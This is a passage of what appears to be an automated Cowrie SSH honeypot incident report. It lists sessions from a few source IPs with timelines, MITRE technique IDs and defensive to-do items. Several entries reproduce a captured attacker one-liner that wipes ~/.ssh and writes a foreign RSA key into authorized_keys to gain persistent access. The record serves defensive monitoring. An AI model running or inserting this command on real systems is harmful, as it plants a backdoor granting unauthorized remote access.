- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8dbdae431e9

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:44` | `cowrie.session.connect` |
| `2026-04-11 06:14:44` | `cowrie.client.version` |
| `2026-04-11 06:14:45` | `cowrie.client.kex` |
| `2026-04-11 06:14:46` | `cowrie.login.success` |
| `2026-04-11 06:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454f9176e572

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:45` | `cowrie.session.connect` |
| `2026-04-11 06:14:45` | `cowrie.client.version` |
| `2026-04-11 06:14:45` | `cowrie.client.kex` |
| `2026-04-11 06:14:46` | `cowrie.login.success` |
| `2026-04-11 06:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d152818843ae

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:15 |
| **Last Seen** | 2026-04-11 06:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:15:24` | `cowrie.session.connect` |
| `2026-04-11 06:15:24` | `cowrie.client.version` |
| `2026-04-11 06:15:24` | `cowrie.client.kex` |
| `2026-04-11 06:15:24` | `cowrie.login.success` |
| `2026-04-11 06:15:25` | `cowrie.session.params` |
| `2026-04-11 06:15:25` | `cowrie.command.input` |
| `2026-04-11 06:15:25` | `cowrie.command.failed` |
| `2026-04-11 06:15:25` | `cowrie.log.closed` |
| `2026-04-11 06:15:25` | `cowrie.session.params` |
| `2026-04-11 06:15:25` | `cowrie.command.input` |
| `2026-04-11 06:15:25` | `cowrie.session.file_download` |
| `2026-04-11 06:15:25` | `cowrie.log.closed` |
| `2026-04-11 06:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce8c69e6bb8

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:15 |
| **Last Seen** | 2026-04-11 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:15:27` | `cowrie.session.connect` |
| `2026-04-11 06:15:27` | `cowrie.client.version` |
| `2026-04-11 06:15:27` | `cowrie.client.kex` |
| `2026-04-11 06:15:27` | `cowrie.login.success` |
| `2026-04-11 06:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08bec6ec6b66

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:15 |
| **Last Seen** | 2026-04-11 06:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:15:27` | `cowrie.session.connect` |
| `2026-04-11 06:15:27` | `cowrie.client.version` |
| `2026-04-11 06:15:27` | `cowrie.client.kex` |
| `2026-04-11 06:15:27` | `cowrie.login.success` |
| `2026-04-11 06:15:28` | `cowrie.session.params` |
| `2026-04-11 06:15:28` | `cowrie.command.input` |
| `2026-04-11 06:15:28` | `cowrie.command.failed` |
| `2026-04-11 06:15:28` | `cowrie.log.closed` |
| `2026-04-11 06:15:28` | `cowrie.session.params` |
| `2026-04-11 06:15:28` | `cowrie.command.input` |
| `2026-04-11 06:15:28` | `cowrie.session.file_download` |
| `2026-04-11 06:15:28` | `cowrie.log.closed` |
| `2026-04-11 06:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a085ce6ce9

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:15 |
| **Last Seen** | 2026-04-11 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:15:30` | `cowrie.session.connect` |
| `2026-04-11 06:15:30` | `cowrie.client.version` |
| `2026-04-11 06:15:31` | `cowrie.client.kex` |
| `2026-04-11 06:15:31` | `cowrie.login.success` |
| `2026-04-11 06:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498a4fc49868

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:03` | `cowrie.session.connect` |
| `2026-04-11 06:16:03` | `cowrie.client.version` |
| `2026-04-11 06:16:04` | `cowrie.client.kex` |
| `2026-04-11 06:16:05` | `cowrie.login.success` |
| `2026-04-11 06:16:05` | `cowrie.session.params` |
| `2026-04-11 06:16:05` | `cowrie.command.input` |
| `2026-04-11 06:16:05` | `cowrie.command.failed` |
| `2026-04-11 06:16:06` | `cowrie.log.closed` |
| `2026-04-11 06:16:06` | `cowrie.session.params` |
| `2026-04-11 06:16:06` | `cowrie.command.input` |
| `2026-04-11 06:16:06` | `cowrie.session.file_download` |
| `2026-04-11 06:16:06` | `cowrie.log.closed` |
| `2026-04-11 06:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2964823c453b

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:07` | `cowrie.session.connect` |
| `2026-04-11 06:16:07` | `cowrie.client.version` |
| `2026-04-11 06:16:07` | `cowrie.client.kex` |
| `2026-04-11 06:16:08` | `cowrie.login.success` |
| `2026-04-11 06:16:08` | `cowrie.session.params` |
| `2026-04-11 06:16:08` | `cowrie.command.input` |
| `2026-04-11 06:16:08` | `cowrie.command.failed` |
| `2026-04-11 06:16:08` | `cowrie.log.closed` |
| `2026-04-11 06:16:08` | `cowrie.session.params` |
| `2026-04-11 06:16:08` | `cowrie.command.input` |
| `2026-04-11 06:16:08` | `cowrie.session.file_download` |
| `2026-04-11 06:16:08` | `cowrie.log.closed` |
| `2026-04-11 06:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feecb5d8d684

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:10` | `cowrie.session.connect` |
| `2026-04-11 06:16:10` | `cowrie.client.version` |
| `2026-04-11 06:16:10` | `cowrie.client.kex` |
| `2026-04-11 06:16:11` | `cowrie.login.success` |
| `2026-04-11 06:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96298b4d2db

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:10` | `cowrie.session.connect` |
| `2026-04-11 06:16:10` | `cowrie.client.version` |
| `2026-04-11 06:16:10` | `cowrie.client.kex` |
| `2026-04-11 06:16:10` | `cowrie.login.success` |
| `2026-04-11 06:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7349181c23a

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:53` | `cowrie.session.connect` |
| `2026-04-11 06:16:53` | `cowrie.client.version` |
| `2026-04-11 06:16:53` | `cowrie.client.kex` |
| `2026-04-11 06:16:53` | `cowrie.login.success` |
| `2026-04-11 06:16:53` | `cowrie.session.params` |
| `2026-04-11 06:16:53` | `cowrie.command.input` |
| `2026-04-11 06:16:53` | `cowrie.command.failed` |
| `2026-04-11 06:16:53` | `cowrie.log.closed` |
| `2026-04-11 06:16:53` | `cowrie.session.params` |
| `2026-04-11 06:16:53` | `cowrie.command.input` |
| `2026-04-11 06:16:53` | `cowrie.session.file_download` |
| `2026-04-11 06:16:53` | `cowrie.log.closed` |
| `2026-04-11 06:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0ba1dcfcee

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:16 |
| **Last Seen** | 2026-04-11 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:16:55` | `cowrie.session.connect` |
| `2026-04-11 06:16:55` | `cowrie.client.version` |
| `2026-04-11 06:16:55` | `cowrie.client.kex` |
| `2026-04-11 06:16:55` | `cowrie.login.success` |
| `2026-04-11 06:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d60cea9354f

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:18 |
| **Last Seen** | 2026-04-11 06:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:18:14` | `cowrie.session.connect` |
| `2026-04-11 06:18:14` | `cowrie.client.version` |
| `2026-04-11 06:18:14` | `cowrie.client.kex` |
| `2026-04-11 06:18:16` | `cowrie.login.success` |
| `2026-04-11 06:18:17` | `cowrie.session.params` |
| `2026-04-11 06:18:17` | `cowrie.command.input` |
| `2026-04-11 06:18:17` | `cowrie.command.failed` |
| `2026-04-11 06:18:17` | `cowrie.log.closed` |
| `2026-04-11 06:18:18` | `cowrie.session.params` |
| `2026-04-11 06:18:18` | `cowrie.command.input` |
| `2026-04-11 06:18:18` | `cowrie.session.file_download` |
| `2026-04-11 06:18:18` | `cowrie.log.closed` |
| `2026-04-11 06:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52bfcf87cc9a

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:18 |
| **Last Seen** | 2026-04-11 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:18:22` | `cowrie.session.connect` |
| `2026-04-11 06:18:22` | `cowrie.client.version` |
| `2026-04-11 06:18:22` | `cowrie.client.kex` |
| `2026-04-11 06:18:23` | `cowrie.login.success` |
| `2026-04-11 06:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3092e05e9c8c

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:19 |
| **Last Seen** | 2026-04-11 06:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:19:12` | `cowrie.session.connect` |
| `2026-04-11 06:19:12` | `cowrie.client.version` |
| `2026-04-11 06:19:12` | `cowrie.client.kex` |
| `2026-04-11 06:19:13` | `cowrie.login.success` |
| `2026-04-11 06:19:13` | `cowrie.session.params` |
| `2026-04-11 06:19:13` | `cowrie.command.input` |
| `2026-04-11 06:19:13` | `cowrie.command.failed` |
| `2026-04-11 06:19:13` | `cowrie.log.closed` |
| `2026-04-11 06:19:13` | `cowrie.session.params` |
| `2026-04-11 06:19:13` | `cowrie.command.input` |
| `2026-04-11 06:19:13` | `cowrie.session.file_download` |
| `2026-04-11 06:19:13` | `cowrie.log.closed` |
| `2026-04-11 06:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762e76ab62fd

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:19 |
| **Last Seen** | 2026-04-11 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:19:15` | `cowrie.session.connect` |
| `2026-04-11 06:19:15` | `cowrie.client.version` |
| `2026-04-11 06:19:15` | `cowrie.client.kex` |
| `2026-04-11 06:19:15` | `cowrie.login.success` |
| `2026-04-11 06:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9c1ad26661

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:19 |
| **Last Seen** | 2026-04-11 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:19:32` | `cowrie.session.connect` |
| `2026-04-11 06:19:32` | `cowrie.client.version` |
| `2026-04-11 06:19:32` | `cowrie.client.kex` |
| `2026-04-11 06:19:34` | `cowrie.login.success` |
| `2026-04-11 06:19:34` | `cowrie.session.params` |
| `2026-04-11 06:19:34` | `cowrie.command.input` |
| `2026-04-11 06:19:34` | `cowrie.command.failed` |
| `2026-04-11 06:19:34` | `cowrie.log.closed` |
| `2026-04-11 06:19:35` | `cowrie.session.params` |
| `2026-04-11 06:19:35` | `cowrie.command.input` |
| `2026-04-11 06:19:35` | `cowrie.session.file_download` |
| `2026-04-11 06:19:35` | `cowrie.log.closed` |
| `2026-04-11 06:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1956bfd57a4

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:19 |
| **Last Seen** | 2026-04-11 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:19:39` | `cowrie.session.connect` |
